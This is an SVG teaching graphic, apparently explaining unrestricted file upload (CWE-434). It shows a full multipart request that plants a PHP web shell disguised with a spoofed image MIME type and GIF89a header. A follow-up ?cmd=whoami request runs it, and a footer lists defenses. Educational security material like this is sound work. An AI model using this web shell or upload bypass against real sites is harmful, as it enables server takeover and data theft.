<svg xmlns="http://www.w3.org/2000/svg" width="1280" height="720" viewBox="0 0 1280 720">
  <rect width="1280" height="720" fill="#fefefe"/>
  <ellipse cx="80" cy="60" rx="140" ry="75" fill="#ffd6e8" opacity="0.55"/>
  <ellipse cx="1200" cy="70" rx="130" ry="70" fill="#c8e6ff" opacity="0.55"/>
  <ellipse cx="1150" cy="660" rx="150" ry="65" fill="#fff3b0" opacity="0.5"/>
  <ellipse cx="100" cy="650" rx="110" ry="55" fill="#e8d5ff" opacity="0.45"/>
  <text x="640" y="42" text-anchor="middle" font-family="Segoe UI,system-ui,sans-serif" font-size="26" font-weight="700" fill="#1e3a5f">Malicious file upload → PHP web shell (CWE-434)</text>
  <text x="640" y="66" text-anchor="middle" font-size="13" fill="#666">Extremely technical · Attacker only</text>
  <!-- ludzik -->
  <g transform="translate(40,120)">
    <circle cx="48" cy="32" r="28" fill="#2d3436"/>
    <rect x="18" y="58" width="60" height="68" rx="12" fill="#3d5a9e"/>
    <rect x="5" y="88" width="48" height="32" rx="6" fill="#9aa0a6"/>
    <text x="48" y="140" text-anchor="middle" font-size="13" fill="#333">Attacker</text>
  </g>
  <!-- code card -->
  <rect x="170" y="85" width="640" height="355" rx="14" fill="#1a1a2e" stroke="#333" stroke-width="2"/>
  <text x="188" y="112" fill="#a8e6cf" font-family="Consolas,ui-monospace,monospace" font-size="12.5">POST /avatar/upload HTTP/1.1</text>
  <text x="188" y="132" fill="#a8e6cf" font-family="Consolas,monospace" font-size="12">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary</text>
  <text x="188" y="155" fill="#888" font-family="Consolas,monospace" font-size="11">------WebKitFormBoundary</text>
  <text x="188" y="175" fill="#fff" font-family="Consolas,monospace" font-size="11.5">Content-Disposition: form-data; name="avatar"; filename="image.php"</text>
  <text x="188" y="195" fill="#ffd93d" font-family="Consolas,monospace" font-size="11.5">Content-Type: image/jpeg</text>
  <text x="430" y="195" fill="#ff6b8a" font-size="10">← spoofed part MIME</text>
  <text x="188" y="218" fill="#dfe6e9" font-family="Consolas,monospace" font-size="11.5">GIF89a;</text>
  <text x="188" y="240" fill="#ff9f43" font-family="Consolas,monospace" font-size="11.5">&lt;?php system($_GET['cmd']); ?&gt;</text>
  <text x="188" y="262" fill="#888" font-family="Consolas,monospace" font-size="11">------WebKitFormBoundary--</text>
  <text x="188" y="290" fill="#7bed9f" font-family="Consolas,monospace" font-size="12">Saved: /uploads/image.php</text>
  <text x="188" y="312" fill="#bbb" font-size="10">(from filename= in Content-Disposition)</text>
  <rect x="188" y="325" width="600" height="52" rx="8" fill="#2d3436"/>
  <text x="200" y="348" fill="#dfe6e9" font-size="10.5">GET /uploads/image.php?cmd=whoami HTTP/1.1</text>
  <text x="200" y="368" fill="#dfe6e9" font-size="10.5">→ mod_php executes → RCE (web shell)</text>
  <!-- step boxes -->
  <rect x="830" y="100" width="400" height="72" rx="12" fill="#ffe0eb" stroke="#e8a0b5" stroke-width="1"/>
  <text x="850" y="128" font-size="14" font-weight="600" fill="#1e3a5f">1. Save uploads/image.php</text>
  <text x="850" y="150" font-size="11" fill="#555">Trusts Content-Type, keeps .php name</text>
  <rect x="830" y="188" width="400" height="72" rx="12" fill="#d4edda" stroke="#9fd4a8" stroke-width="1"/>
  <text x="850" y="216" font-size="14" font-weight="600" fill="#1e3a5f">2. GET ?cmd=… executes code</text>
  <text x="850" y="238" font-size="11" fill="#555">Apache mod_php → RCE</text>
  <rect x="830" y="276" width="400" height="88" rx="12" fill="#f8d7da" stroke="#e8a0a0" stroke-width="1"/>
  <text x="850" y="304" font-size="14" font-weight="600" fill="#c0392b">Impact</text>
  <text x="850" y="326" font-size="11" fill="#333">Read secrets, DB dump, backdoor</text>
  <text x="850" y="348" font-size="10" fill="#555">PortSwigger RCE upload pattern</text>
  <!-- lesson -->
  <rect x="60" y="620" width="1160" height="56" rx="12" fill="#ffc107"/>
  <path d="M 88 648 h 8 v -20 a 14 14 0 1 1 8 0 v 20 h 8" fill="none" stroke="#1e3a5f" stroke-width="2"/>
  <text x="640" y="654" text-anchor="middle" font-size="15" font-weight="600" fill="#1e3a5f">Defense: extension allow-list · verify magic bytes · random server name · no PHP execution in uploads/</text>
</svg>